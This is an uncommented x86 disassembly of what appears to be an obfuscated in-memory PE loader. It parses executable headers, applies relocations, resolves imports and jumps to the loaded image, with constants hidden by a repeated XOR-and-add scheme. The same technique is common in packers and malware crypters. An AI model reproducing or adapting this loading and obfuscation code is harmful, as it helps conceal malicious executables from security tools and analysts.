  421108:	call   0x42109d
  42110d:	push   esi
  42110e:	mov    ecx,edi
  421110:	mov    BYTE PTR [esi+0x5],0xf0
  421114:	call   0x42106e
  421119:	push   esi
  42111a:	mov    BYTE PTR [esi+0x6],0xec
  42111e:	call   0x42103b
  421123:	mov    BYTE PTR [esi+0x2],0xe9
  421127:	mov    edx,esi
  421129:	jmp    0x42100b
  42112e:	push   ebp
  42112f:	mov    ebp,esp
  421131:	push   ecx
  421132:	mov    ecx,DWORD PTR [edx+0x194]
  421138:	push   esi
  421139:	mov    esi,DWORD PTR [ebp+0x8]
  42113c:	mov    esi,DWORD PTR [esi]
  42113e:	mov    DWORD PTR [ecx],esi
  421140:	mov    ecx,DWORD PTR [edx+0x194]
  421146:	mov    ecx,DWORD PTR [ecx]
  421148:	mov    esi,DWORD PTR [edx+0x190]
  42114e:	mov    DWORD PTR [esi],ecx
  421150:	mov    eax,DWORD PTR [edx+0x194]
  421156:	mov    ecx,DWORD PTR [eax]
  421158:	mov    ecx,DWORD PTR [ecx+0x3c]
  42115b:	add    ecx,DWORD PTR [eax]
  42115d:	mov    DWORD PTR [ebp-0x4],0xf89ca5b5
  421164:	mov    eax,DWORD PTR [ebp-0x4]
  421167:	movzx  ecx,WORD PTR [ecx+0x16]
  42116b:	xor    eax,0x75108b3
  421170:	add    eax,0x3272fa
  421175:	pop    esi
  421176:	test   ecx,eax
  421178:	je     0x421186
  42117a:	mov    eax,DWORD PTR [edx+0x1c8]
  421180:	mov    DWORD PTR [eax],0xf89c85b4
  421186:	leave  
  421187:	ret    0x4
  42118a:	push   ebp
  42118b:	mov    ebp,esp
  42118d:	sub    esp,0x70
  421190:	and    DWORD PTR [ebp-0x20],0x0
  421194:	mov    DWORD PTR [ebp-0x18],0xf89cb5b5
  42119b:	mov    DWORD PTR [ebp-0x1c],0xf89c85f5
  4211a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  4211a9:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4211b0:	mov    DWORD PTR [ebp-0x2c],0xf89f05b5
  4211b7:	mov    eax,DWORD PTR [ebp+0x20]
  4211ba:	mov    eax,DWORD PTR [eax+0x194]
  4211c0:	mov    DWORD PTR [ebp-0xc],eax
  4211c3:	mov    eax,DWORD PTR [ebp+0x20]
  4211c6:	push   ebx
  4211c7:	push   esi
  4211c8:	mov    esi,DWORD PTR [eax+0x190]
  4211ce:	mov    eax,DWORD PTR [ebp+0x20]
  4211d1:	mov    eax,DWORD PTR [eax+0x18c]
  4211d7:	mov    DWORD PTR [ebp-0x8],eax
  4211da:	mov    eax,DWORD PTR [eax]
  4211dc:	push   edi
  4211dd:	mov    DWORD PTR [ebp-0x4],esi
  4211e0:	test   eax,eax
  4211e2:	jne    0x4211ef
  4211e4:	push   DWORD PTR [ebp+0x1c]
  4211e7:	mov    edx,DWORD PTR [ebp+0x20]
  4211ea:	call   0x42112e
  4211ef:	mov    eax,DWORD PTR [esi]
  4211f1:	mov    ebx,DWORD PTR [esi]
  4211f3:	add    ebx,DWORD PTR [eax+0x3c]
  4211f6:	mov    eax,DWORD PTR [ebp+0xc]
  4211f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4211fc:	mov    ecx,DWORD PTR [ecx]
  4211fe:	mov    esi,0x75108b3
  421203:	xor    eax,esi
  421205:	mov    edi,0x3272fa
  42120a:	add    eax,edi
  42120c:	cmp    eax,ecx
  42120e:	jne    0x421446
  421214:	mov    eax,DWORD PTR [ebp-0xc]
  421217:	mov    eax,DWORD PTR [eax]
  421219:	mov    DWORD PTR [ebp-0x10],eax
  42121c:	mov    eax,DWORD PTR [ebx+0x50]
  42121f:	mov    DWORD PTR [ebp-0x68],eax
  421222:	mov    eax,DWORD PTR [ebp-0x18]
  421225:	xor    eax,esi
  421227:	add    eax,edi
  421229:	mov    DWORD PTR [ebp-0x64],eax
  42122c:	mov    eax,DWORD PTR [ebp-0x14]
  42122f:	and    DWORD PTR [ebp-0x6c],0x0
  421233:	xor    eax,esi
  421235:	add    eax,edi
  421237:	mov    DWORD PTR [ebp-0x60],eax
  42123a:	lea    eax,[ebp-0x70]
  42123d:	push   eax
  42123e:	mov    eax,DWORD PTR [ebp+0x8]
  421241:	xor    eax,esi
  421243:	add    eax,edi
  421245:	push   eax
  421246:	mov    eax,DWORD PTR [ebp+0x20]
  421249:	add    eax,0xaa
  42124e:	push   eax
  42124f:	mov    eax,DWORD PTR [ebp+0x20]
  421252:	mov    eax,DWORD PTR [eax+0x198]
  421258:	mov    DWORD PTR [ebp-0x70],0x4
  42125f:	push   DWORD PTR [eax]
  421261:	mov    eax,DWORD PTR [ebp+0x10]
  421264:	call   eax
  421266:	mov    ecx,DWORD PTR [ebp-0xc]
  421269:	mov    ecx,DWORD PTR [ecx]
  42126b:	mov    edx,DWORD PTR [ebp-0x8]
  42126e:	mov    DWORD PTR [ebp-0x6c],eax
  421271:	mov    DWORD PTR [ebp+0x1c],eax
  421274:	mov    DWORD PTR [edx],ecx
  421276:	mov    ecx,DWORD PTR [ebp-0x4]
  421279:	mov    DWORD PTR [ecx],eax
  42127b:	mov    eax,DWORD PTR [ebx+0x50]
  42127e:	mov    DWORD PTR [ebp-0x68],eax
  421281:	mov    eax,DWORD PTR [ebp-0x1c]
  421284:	xor    eax,esi
  421286:	add    eax,edi
  421288:	mov    DWORD PTR [ebp-0x64],eax
  42128b:	lea    eax,[ebp-0x20]
  42128e:	mov    DWORD PTR [ebp-0x60],eax
  421291:	lea    eax,[ebp-0x70]
  421294:	push   eax
  421295:	mov    eax,DWORD PTR [ebp+0x8]
  421298:	xor    eax,esi
  42129a:	add    eax,edi
  42129c:	push   eax
  42129d:	mov    eax,DWORD PTR [ebp+0x20]
  4212a0:	add    eax,0xee
  4212a5:	push   eax
  4212a6:	mov    eax,DWORD PTR [ebp+0x20]
  4212a9:	mov    eax,DWORD PTR [eax+0x198]
  4212af:	mov    DWORD PTR [ebp-0x70],0x4
  4212b6:	push   DWORD PTR [eax]
  4212b8:	mov    eax,DWORD PTR [ebp+0x10]
  4212bb:	call   eax
  4212bd:	test   eax,eax
  4212bf:	je     0x4212e4
  4212c1:	and    DWORD PTR [ebp+0xc],0x0
  4212c5:	cmp    DWORD PTR [ebx+0x50],0x0
  4212c9:	jbe    0x4212e4
  4212cb:	mov    eax,DWORD PTR [ebp+0x1c]
  4212ce:	mov    ecx,DWORD PTR [ebp-0x10]
  4212d1:	sub    ecx,eax
  4212d3:	mov    dl,BYTE PTR [ecx+eax*1]
  4212d6:	inc    DWORD PTR [ebp+0xc]
  4212d9:	mov    BYTE PTR [eax],dl
  4212db:	mov    edx,DWORD PTR [ebp+0xc]
  4212de:	inc    eax
  4212df:	cmp    edx,DWORD PTR [ebx+0x50]
  4212e2:	jb     0x4212d3
  4212e4:	mov    edx,DWORD PTR [ebp+0x1c]
  4212e7:	mov    ecx,DWORD PTR [edx+0x3c]
  4212ea:	add    ecx,edx
  4212ec:	mov    eax,DWORD PTR [ecx+0xa0]
  4212f2:	mov    ebx,DWORD PTR [ecx+0x28]
  4212f5:	add    eax,edx
  4212f7:	sub    edx,DWORD PTR [ebp-0x10]
  4212fa:	add    ebx,DWORD PTR [ebp+0x1c]
  4212fd:	mov    DWORD PTR [ebp+0xc],edx
  421300:	mov    DWORD PTR [ebp-0x2c],ecx
  421303:	mov    DWORD PTR [ebp-0x14],ebx
  421306:	mov    DWORD PTR [ebp-0x8],0x0
  42130d:	jmp    0x421389
  42130f:	add    edx,0xfffffff8
  421312:	shr    edx,1
  421314:	mov    DWORD PTR [ebp-0x18],edx
  421317:	je     0x421375
  421319:	lea    edx,[eax+0x8]
  42131c:	mov    DWORD PTR [ebp-0x4],edx
  42131f:	mov    edx,DWORD PTR [ebp-0x18]
  421322:	mov    DWORD PTR [ebp-0x18],edx
  421325:	mov    edx,DWORD PTR [ebp-0x4]
  421328:	movzx  edx,WORD PTR [edx]
  42132b:	mov    DWORD PTR [ebp-0x24],edx
  42132e:	and    edx,0xfff
  421334:	mov    DWORD PTR [ebp-0x28],edx
  421337:	mov    edx,DWORD PTR [ebp-0x24]
  42133a:	shr    edx,0xc
  42133d:	add    edx,0xffcd8d06
  421343:	xor    edx,esi
  421345:	cmp    edx,0xf89c85ba
  42134b:	jne    0x42136c
  42134d:	mov    edx,DWORD PTR [ebp-0x28]
  421350:	add    edx,DWORD PTR [ebp+0x1c]
  421353:	mov    ebx,DWORD PTR [eax]
  421355:	cmp    DWORD PTR [ebx+edx*1],0x0
  421359:	je     0x421369
  42135b:	mov    ecx,DWORD PTR [ebp+0xc]
  42135e:	add    ecx,DWORD PTR [ebx+edx*1]
  421361:	mov    ebx,DWORD PTR [eax]
  421363:	mov    DWORD PTR [edx+ebx*1],ecx
  421366:	mov    ecx,DWORD PTR [ebp-0x2c]
  421369:	mov    ebx,DWORD PTR [ebp-0x14]
  42136c:	add    DWORD PTR [ebp-0x4],0x2
  421370:	dec    DWORD PTR [ebp-0x18]
  421373:	jne    0x421325
  421375:	mov    edx,DWORD PTR [ebp-0xc]
  421378:	add    DWORD PTR [ebp-0x8],edx
  42137b:	mov    edx,DWORD PTR [ebp-0x8]
  42137e:	cmp    edx,DWORD PTR [ecx+0xa4]
  421384:	jae    0x421397
  421386:	add    eax,DWORD PTR [ebp-0xc]
  421389:	mov    edx,DWORD PTR [eax+0x4]
  42138c:	mov    DWORD PTR [ebp-0xc],edx
  42138f:	test   edx,edx
  421391:	jne    0x42130f
  421397:	mov    eax,DWORD PTR [ebp-0x10]
  42139a:	mov    DWORD PTR [ebp-0x6c],eax
  42139d:	mov    DWORD PTR [ebp-0x70],0x4
  4213a4:	mov    eax,DWORD PTR [ecx+0x50]
  4213a7:	mov    DWORD PTR [ebp-0x68],eax
  4213aa:	mov    eax,DWORD PTR [ebp-0x1c]
  4213ad:	xor    eax,esi
  4213af:	add    eax,edi
  4213b1:	mov    DWORD PTR [ebp-0x64],eax
  4213b4:	lea    eax,[ebp-0x20]
  4213b7:	mov    DWORD PTR [ebp-0x60],eax
  4213ba:	lea    eax,[ebp-0x70]
  4213bd:	push   eax
  4213be:	mov    eax,DWORD PTR [ebp+0x8]
  4213c1:	xor    eax,esi
  4213c3:	add    eax,edi
  4213c5:	push   eax
  4213c6:	mov    eax,DWORD PTR [ebp+0x20]
  4213c9:	add    eax,0xee
  4213ce:	push   eax
  4213cf:	mov    eax,DWORD PTR [ebp+0x20]
  4213d2:	mov    eax,DWORD PTR [eax+0x198]
  4213d8:	push   DWORD PTR [eax]
  4213da:	mov    eax,DWORD PTR [ebp+0x10]
  4213dd:	call   eax
  4213df:	mov    eax,DWORD PTR [ebp+0x20]
  4213e2:	mov    eax,DWORD PTR [eax+0x180]
  4213e8:	add    eax,DWORD PTR [ebp+0xc]
  4213eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213ee:	push   DWORD PTR [ebp+0x18]
  4213f1:	mov    DWORD PTR [eax],ecx
  4213f3:	push   DWORD PTR [ebp+0x14]
  4213f6:	push   DWORD PTR [ebp+0x1c]
  4213f9:	call   ebx
  4213fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213fe:	add    ecx,DWORD PTR [ebp+0x20]
  421401:	lea    eax,[ebp+0x4]
  421404:	mov    DWORD PTR [ebp+0x20],ecx
  421407:	mov    ecx,DWORD PTR [ebp+0x20]
  42140a:	mov    ecx,DWORD PTR [ebp+0x20]
  42140d:	mov    edx,DWORD PTR [ecx+0x190]
  421413:	mov    ecx,DWORD PTR [ebp+0x20]
  421416:	mov    ecx,DWORD PTR [ecx+0x18c]
  42141c:	mov    esi,DWORD PTR [ecx]
  42141e:	cmp    DWORD PTR [eax],esi
  421420:	jb     0x421441
  421422:	mov    esi,DWORD PTR [edx]
  421424:	mov    edi,DWORD PTR [edx]
  421426:	mov    esi,DWORD PTR [esi+0x3c]
  421429:	lea    esi,[edi+esi*1+0x50]
  42142d:	mov    edi,DWORD PTR [ecx]
  42142f:	add    edi,DWORD PTR [esi]
  421431:	cmp    DWORD PTR [eax],edi
  421433:	jae    0x421441
  421435:	mov    esi,DWORD PTR [ecx]
  421437:	mov    ecx,DWORD PTR [eax]
  421439:	mov    edx,DWORD PTR [edx]
  42143b:	sub    ecx,esi
  42143d:	add    edx,ecx
  42143f:	mov    DWORD PTR [eax],edx
  421441:	mov    eax,DWORD PTR [ebp+0xc]
  421444:	jmp    0x421448
  421446:	xor    eax,eax
  421448:	pop    edi
  421449:	pop    esi
  42144a:	pop    ebx
  42144b:	leave  
  42144c:	ret    0x1c
  42144f:	push   ebp
  421450:	mov    ebp,esp
  421452:	sub    esp,0x1c
  421455:	push   esi
  421456:	mov    esi,eax
  421458:	mov    eax,DWORD PTR [ecx+0x190]
  42145e:	cmp    DWORD PTR [eax],0x0
  421461:	je     0x421571
  421467:	test   edx,edx
  421469:	je     0x421571
  42146f:	test   esi,esi
  421471:	je     0x421571
  421477:	mov    eax,DWORD PTR [esi+0x88]
  42147d:	test   eax,eax
  42147f:	je     0x42156c
  421485:	cmp    DWORD PTR [esi+0x8c],0x10
  42148c:	je     0x42156c
  421492:	cmp    DWORD PTR [esi+0x34],edx
  421495:	je     0x42156c
  42149b:	mov    esi,DWORD PTR [ecx+0x18c]
  4214a1:	and    DWORD PTR [ebp-0x10],0x0
  4214a5:	mov    ecx,edx
  4214a7:	sub    ecx,DWORD PTR [esi]
  4214a9:	add    eax,edx
  4214ab:	movzx  edx,WORD PTR [eax+0xc]
  4214af:	mov    DWORD PTR [ebp-0x1c],ecx
  4214b2:	movzx  ecx,WORD PTR [eax+0xe]
  4214b6:	add    ecx,edx
  4214b8:	je     0x42156c
  4214be:	lea    ecx,[eax+0x14]
  4214c1:	push   ebx
  4214c2:	mov    DWORD PTR [ebp-0x18],ecx
  4214c5:	mov    esi,0x7fffffff
  4214ca:	push   edi
  4214cb:	test   DWORD PTR [ecx],esi
  4214cd:	je     0x42154e
  4214cf:	mov    edx,DWORD PTR [ecx]
  4214d1:	and    DWORD PTR [ebp-0xc],0x0
  4214d5:	and    edx,esi
  4214d7:	add    edx,eax
  4214d9:	movzx  edi,WORD PTR [edx+0xe]
  4214dd:	movzx  ebx,WORD PTR [edx+0xc]
  4214e1:	add    edi,ebx
  4214e3:	je     0x42154e
  4214e5:	lea    ecx,[edx+0x14]
  4214e8:	mov    DWORD PTR [ebp-0x14],ecx
  4214eb:	test   DWORD PTR [ecx],esi
  4214ed:	je     0x421530
  4214ef:	mov    ecx,DWORD PTR [ecx]
  4214f1:	and    DWORD PTR [ebp-0x8],0x0
  4214f5:	and    ecx,esi
  4214f7:	add    ecx,eax
  4214f9:	movzx  edi,WORD PTR [ecx+0xe]
  4214fd:	movzx  ebx,WORD PTR [ecx+0xc]
  421501:	add    edi,ebx
  421503:	je     0x421530
  421505:	lea    edi,[ecx+0x14]
  421508:	mov    DWORD PTR [ebp-0x4],edi
  42150b:	mov    edi,DWORD PTR [ebp-0x4]
  42150e:	mov    edi,DWORD PTR [edi]
  421510:	test   edi,edi
  421512:	je     0x42151a
  421514:	mov    ebx,DWORD PTR [ebp-0x1c]
  421517:	add    DWORD PTR [edi+eax*1],ebx
  42151a:	movzx  edi,WORD PTR [ecx+0xe]
  42151e:	movzx  ebx,WORD PTR [ecx+0xc]
  421522:	inc    DWORD PTR [ebp-0x8]
  421525:	add    DWORD PTR [ebp-0x4],0x8
  421529:	add    edi,ebx
  42152b:	cmp    DWORD PTR [ebp-0x8],edi
  42152e:	jb     0x42150b
  421530:	movzx  edi,WORD PTR [edx+0xe]
  421534:	movzx  ebx,WORD PTR [edx+0xc]
  421538:	mov    ecx,DWORD PTR [ebp-0x14]
  42153b:	inc    DWORD PTR [ebp-0xc]
  42153e:	add    ecx,0x8
  421541:	add    edi,ebx
  421543:	mov    DWORD PTR [ebp-0x14],ecx
  421546:	cmp    DWORD PTR [ebp-0xc],edi
  421549:	jb     0x4214eb
  42154b:	mov    ecx,DWORD PTR [ebp-0x18]
  42154e:	movzx  edx,WORD PTR [eax+0xe]
  421552:	movzx  edi,WORD PTR [eax+0xc]
  421556:	inc    DWORD PTR [ebp-0x10]
  421559:	add    ecx,0x8
  42155c:	add    edx,edi
  42155e:	mov    DWORD PTR [ebp-0x18],ecx
  421561:	cmp    DWORD PTR [ebp-0x10],edx
  421564:	jb     0x4214cb
  42156a:	pop    edi
  42156b:	pop    ebx
  42156c:	xor    eax,eax
  42156e:	inc    eax
  42156f:	jmp    0x421573
  421571:	xor    eax,eax
  421573:	pop    esi
  421574:	leave  
  421575:	ret    
  421576:	push   ebp
  421577:	mov    ebp,esp
  421579:	mov    ecx,DWORD PTR [ecx+0x190]
  42157f:	mov    eax,DWORD PTR [ebp+0xc]
  421582:	sub    esp,0x10
  421585:	push   ebx
  421586:	xor    ebx,ebx
  421588:	push   esi
  421589:	push   edi
  42158a:	cmp    DWORD PTR [ecx],ebx
  42158c:	je     0x421614
  421592:	cmp    eax,ebx
  421594:	je     0x421614
  421596:	cmp    DWORD PTR [eax+0x78],ebx
  421599:	jne    0x4215a0
  42159b:	xor    eax,eax
  42159d:	inc    eax
  42159e:	jmp    0x421616
  4215a0:	mov    eax,DWORD PTR [eax+0x78]
  4215a3:	add    eax,DWORD PTR [ebp+0x8]
  4215a6:	mov    ecx,DWORD PTR [eax+0x1c]
  4215a9:	mov    edx,DWORD PTR [eax+0x24]
  4215ac:	mov    esi,DWORD PTR [eax+0x14]
  4215af:	mov    edi,DWORD PTR [eax+0x18]
  4215b2:	add    ecx,DWORD PTR [ebp+0x8]
  4215b5:	add    edx,DWORD PTR [ebp+0x8]
  4215b8:	mov    DWORD PTR [ebp-0x4],esi
  4215bb:	cmp    esi,edi
  4215bd:	ja     0x4215c2
  4215bf:	mov    DWORD PTR [ebp-0x4],edi
  4215c2:	mov    DWORD PTR [ebp-0x8],ebx
  4215c5:	cmp    DWORD PTR [ebp-0x4],ebx
  4215c8:	jbe    0x42159b
  4215ca:	cmp    ebx,DWORD PTR [eax+0x14]
  4215cd:	jae    0x4215d5
  4215cf:	movzx  esi,WORD PTR [edx+ebx*2]
  4215d3:	jmp    0x4215d7
  4215d5:	mov    esi,ebx
  4215d7:	lea    esi,[ecx+esi*4]
  4215da:	mov    edi,DWORD PTR [esi]
  4215dc:	test   edi,edi
  4215de:	je     0x421609
  4215e0:	add    edi,DWORD PTR [ebp+0x8]
  4215e3:	mov    DWORD PTR [ebp-0x10],edi
  4215e6:	cmp    edi,eax
  4215e8:	jbe    0x4215fa
  4215ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4215ed:	mov    ebx,DWORD PTR [ebx+0x7c]
  4215f0:	add    ebx,eax
  4215f2:	cmp    edi,ebx
  4215f4:	jae    0x4215fa
  4215f6:	mov    esi,DWORD PTR [esi]
  4215f8:	jmp    0x421602
  4215fa:	sub    edi,DWORD PTR [ebp+0x8]
  4215fd:	mov    DWORD PTR [esi],edi
  4215ff:	mov    esi,DWORD PTR [ebp-0x10]
  421602:	test   esi,esi
  421604:	je     0x421614
  421606:	mov    ebx,DWORD PTR [ebp-0x8]
  421609:	inc    ebx
  42160a:	mov    DWORD PTR [ebp-0x8],ebx
  42160d:	cmp    ebx,DWORD PTR [ebp-0x4]
  421610:	jb     0x4215ca
  421612:	jmp    0x42159b
  421614:	xor    eax,eax
  421616:	pop    edi
  421617:	pop    esi
  421618:	pop    ebx
  421619:	leave  
  42161a:	ret    0x8
  42161d:	push   ebp
  42161e:	mov    ebp,esp
  421620:	sub    esp,0x2c
  421623:	mov    edx,0xf89c85b5
  421628:	mov    DWORD PTR [ebp-0x4],edx
  42162b:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  421632:	mov    eax,DWORD PTR [ebp-0x4]
  421635:	mov    ecx,DWORD PTR [ebp-0x4]
  421638:	mov    ecx,DWORD PTR [ebp-0x4]
  42163b:	mov    ecx,DWORD PTR [ebp-0x4]
  42163e:	mov    ecx,DWORD PTR [ebp-0x4]
  421641:	mov    ecx,DWORD PTR [ebp-0x4]
  421644:	push   ebx
  421645:	mov    ebx,DWORD PTR [ebp+0x10]
  421648:	push   esi
  421649:	mov    esi,0x75108b3
  42164e:	mov    DWORD PTR [ebp-0x10],0x352ebcf
  421655:	mov    ecx,DWORD PTR [ebp-0x4]
  421658:	mov    ebx,DWORD PTR [ebx+0x190]
  42165e:	push   edi
  42165f:	mov    edi,0x3272fa
  421664:	xor    ecx,esi
  421666:	xor    eax,esi
  421668:	add    eax,edi
  42166a:	add    ecx,edi
  42166c:	mov    DWORD PTR [ebp-0x18],eax
  42166f:	cmp    ecx,DWORD PTR [ebx]
  421671:	je     0x4218f2
  421677:	mov    ebx,DWORD PTR [ebp-0x4]
  42167a:	mov    ecx,DWORD PTR [ebp+0xc]
  42167d:	xor    ebx,esi
  42167f:	add    ebx,edi
  421681:	cmp    ebx,ecx
  421683:	je     0x4218f2
  421689:	mov    ebx,DWORD PTR [ebp-0x4]
  42168c:	mov    ecx,DWORD PTR [ecx+0x80]
  421692:	xor    ebx,esi
  421694:	add    ebx,edi
  421696:	cmp    ecx,ebx
  421698:	je     0x4218ed
  42169e:	add    ecx,DWORD PTR [ebp+0x8]
  4216a1:	mov    DWORD PTR [ebp-0x2c],ecx
  4216a4:	mov    ebx,edx
  4216a6:	xor    ebx,esi
  4216a8:	add    ebx,edi
  4216aa:	mov    DWORD PTR [ebp-0x10],ebx
  4216ad:	mov    ebx,DWORD PTR [ebp-0x10]
  4216b0:	cmp    ebx,edx
  4216b2:	je     0x4216c6
  4216b4:	mov    edx,DWORD PTR [ebp-0x10]
  4216b7:	mov    ebx,DWORD PTR [ebp-0x4]
  4216ba:	imul   edx,edx,0x14
  4216bd:	xor    ebx,esi
  4216bf:	add    ebx,edi
  4216c1:	cmp    DWORD PTR [edx+ecx*1],ebx
  4216c4:	jne    0x4216dd
  4216c6:	mov    edx,DWORD PTR [ebp-0x10]
  4216c9:	mov    ebx,DWORD PTR [ebp-0x4]
  4216cc:	imul   edx,edx,0x14
  4216cf:	xor    ebx,esi
  4216d1:	add    ebx,edi
  4216d3:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  4216d7:	je     0x4218df
  4216dd:	mov    eax,DWORD PTR [ebp-0x4]
  4216e0:	mov    ebx,DWORD PTR [ebp-0x4]
  4216e3:	mov    eax,DWORD PTR [ebp-0x10]
  4216e6:	imul   eax,eax,0x14
  4216e9:	add    eax,ecx
  4216eb:	mov    ecx,DWORD PTR [eax+0x10]
  4216ee:	add    ecx,DWORD PTR [ebp+0x8]
  4216f1:	xor    ebx,esi
  4216f3:	mov    DWORD PTR [ebp-0x1c],ecx
  4216f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4216f9:	mov    edx,DWORD PTR [ebp-0x4]
  4216fc:	xor    ecx,esi
  4216fe:	add    ecx,edi
  421700:	xor    edx,esi
  421702:	mov    DWORD PTR [ebp-0x24],ecx
  421705:	mov    ecx,DWORD PTR [eax]
  421707:	add    edx,edi
  421709:	add    ebx,edi
  42170b:	cmp    ecx,edx
  42170d:	je     0x421715
  42170f:	add    ecx,DWORD PTR [ebp+0x8]
  421712:	mov    DWORD PTR [ebp-0x24],ecx
  421715:	mov    ecx,DWORD PTR [ebp-0x4]
  421718:	xor    ecx,esi
  42171a:	add    ecx,DWORD PTR [eax+0xc]
  42171d:	mov    eax,DWORD PTR [ebp+0x8]
  421720:	lea    eax,[ecx+eax*1+0x3272fa]
  421727:	mov    DWORD PTR [ebp+0xc],eax
  42172a:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  421731:	mov    eax,DWORD PTR [ebp+0x10]
  421734:	push   DWORD PTR [ebp+0xc]
  421737:	mov    eax,DWORD PTR [eax+0x1e0]
  42173d:	call   DWORD PTR [eax]
  42173f:	mov    ecx,DWORD PTR [ebp-0x4]
  421742:	xor    ecx,esi
  421744:	add    ecx,edi
  421746:	mov    DWORD PTR [ebp-0xc],eax
  421749:	cmp    ecx,eax
  42174b:	jne    0x42175f
  42174d:	mov    eax,DWORD PTR [ebp+0x10]
  421750:	push   DWORD PTR [ebp+0xc]
  421753:	mov    eax,DWORD PTR [eax+0x1e0]
  421759:	call   DWORD PTR [eax+0xc]
  42175c:	mov    DWORD PTR [ebp-0xc],eax
  42175f:	mov    DWORD PTR [ebp-0x20],0x7f661bcc
  421766:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  42176d:	mov    eax,DWORD PTR [ebp-0x4]
  421770:	xor    eax,esi
  421772:	add    eax,edi
  421774:	cmp    eax,DWORD PTR [ebp-0xc]
  421777:	jne    0x42179c
  421779:	mov    eax,DWORD PTR [ebp-0x8]
  42177c:	mov    ecx,DWORD PTR [ebp-0x20]
  42177f:	xor    eax,esi
  421781:	xor    ecx,esi
  421783:	lea    ebx,[ebx+eax*1+0x3272fa]
  42178a:	mov    eax,DWORD PTR [ebp+0x10]
  42178d:	mov    eax,DWORD PTR [eax+0x1e0]
  421793:	add    ecx,edi
  421795:	imul   ecx,ebx
  421798:	push   ecx
  421799:	call   DWORD PTR [eax+0x24]
  42179c:	mov    eax,DWORD PTR [ebp-0x4]
  42179f:	xor    eax,esi
  4217a1:	add    eax,edi
  4217a3:	cmp    eax,DWORD PTR [ebp-0xc]
  4217a6:	jne    0x4217b7
  4217a8:	mov    eax,DWORD PTR [ebp-0x28]
  4217ab:	xor    eax,esi
  4217ad:	add    eax,edi
  4217af:	cmp    ebx,eax
  4217b1:	jbe    0x421731
  4217b7:	mov    eax,DWORD PTR [ebp-0x4]
  4217ba:	xor    eax,esi
  4217bc:	add    eax,edi
  4217be:	cmp    eax,DWORD PTR [ebp-0xc]
  4217c1:	jne    0x4217da
  4217c3:	mov    eax,DWORD PTR [ebp-0x8]
  4217c6:	mov    ecx,DWORD PTR [ebp-0x18]
  4217c9:	xor    eax,esi
  4217cb:	lea    eax,[ecx+eax*1+0x3272fa]
  4217d2:	mov    DWORD PTR [ebp-0x18],eax
  4217d5:	jmp    0x4218c9
  4217da:	mov    DWORD PTR [ebp-0x14],0x1121bcd
  4217e1:	mov    DWORD PTR [ebp+0xc],0xe042dcf
  4217e8:	mov    ebx,DWORD PTR [ebp-0x4]
  4217eb:	xor    ebx,esi
  4217ed:	add    ebx,edi
  4217ef:	jmp    0x4218b6
  4217f4:	mov    eax,DWORD PTR [ebp-0x4]
  4217f7:	xor    eax,esi
  4217f9:	add    eax,edi
  4217fb:	mov    DWORD PTR [ebp-0x14],eax
  4217fe:	mov    eax,DWORD PTR [ebp-0x4]
  421801:	xor    eax,esi
  421803:	add    eax,edi
  421805:	mov    DWORD PTR [ebp+0xc],eax
  421808:	mov    ecx,DWORD PTR [ebp-0x4]
  42180b:	mov    eax,DWORD PTR [ebp-0x24]
  42180e:	xor    ecx,esi
  421810:	add    ecx,edi
  421812:	cmp    ecx,eax
  421814:	je     0x42181c
  421816:	mov    eax,DWORD PTR [eax+ebx*4]
  421819:	mov    DWORD PTR [ebp-0x14],eax
  42181c:	mov    eax,DWORD PTR [ebp-0x1c]
  42181f:	mov    eax,DWORD PTR [eax+ebx*4]
  421822:	mov    DWORD PTR [ebp+0xc],eax
  421825:	mov    eax,DWORD PTR [ebp-0x4]
  421828:	mov    ecx,DWORD PTR [ebp-0x14]
  42182b:	xor    eax,esi
  42182d:	add    eax,edi
  42182f:	cmp    eax,ecx
  421831:	je     0x42185c
  421833:	mov    eax,DWORD PTR [ebp-0x4]
  421836:	mov    ecx,DWORD PTR [ebp-0x14]
  421839:	xor    eax,esi
  42183b:	add    eax,edi
  42183d:	shr    ecx,0x1f
  421840:	cmp    eax,ecx
  421842:	je     0x42185c
  421844:	mov    ecx,DWORD PTR [ebp-0x14]
  421847:	mov    eax,DWORD PTR [ebp+0x10]
  42184a:	mov    eax,DWORD PTR [eax+0x1e0]
  421850:	movzx  ecx,cx
  421853:	push   ecx
  421854:	push   DWORD PTR [ebp-0xc]
  421857:	call   DWORD PTR [eax+0x8]
  42185a:	jmp    0x421875
  42185c:	mov    eax,DWORD PTR [ebp+0xc]
  42185f:	add    eax,DWORD PTR [ebp+0x8]
  421862:	mov    ecx,DWORD PTR [ebp+0x10]
  421865:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42186b:	add    eax,0x2
  42186e:	push   eax
  42186f:	push   DWORD PTR [ebp-0xc]
  421872:	call   DWORD PTR [ecx+0x8]
  421875:	mov    DWORD PTR [ebp+0xc],eax
  421878:	mov    eax,DWORD PTR [ebp-0x4]
  42187b:	mov    ecx,DWORD PTR [ebp+0xc]
  42187e:	xor    eax,esi
  421880:	add    eax,edi
  421882:	cmp    eax,ecx
  421884:	mov    eax,DWORD PTR [ebp-0x8]
  421887:	jne    0x42189a
  421889:	mov    ecx,DWORD PTR [ebp-0x18]
  42188c:	xor    eax,esi
  42188e:	lea    eax,[ecx+eax*1+0x3272fa]
  421895:	mov    DWORD PTR [ebp-0x18],eax
  421898:	jmp    0x4218aa
  42189a:	mov    ecx,DWORD PTR [ebp+0xc]
  42189d:	xor    eax,esi
  42189f:	add    eax,edi
  4218a1:	imul   eax,ecx
  4218a4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218a7:	mov    DWORD PTR [ecx+ebx*4],eax
  4218aa:	mov    eax,DWORD PTR [ebp-0x8]
  4218ad:	xor    eax,esi
  4218af:	lea    ebx,[ebx+eax*1+0x3272fa]
  4218b6:	mov    eax,DWORD PTR [ebp-0x4]
  4218b9:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218bc:	xor    eax,esi
  4218be:	add    eax,edi
  4218c0:	cmp    DWORD PTR [ecx+ebx*4],eax
  4218c3:	jne    0x4217f4
  4218c9:	mov    edx,DWORD PTR [ebp-0x10]
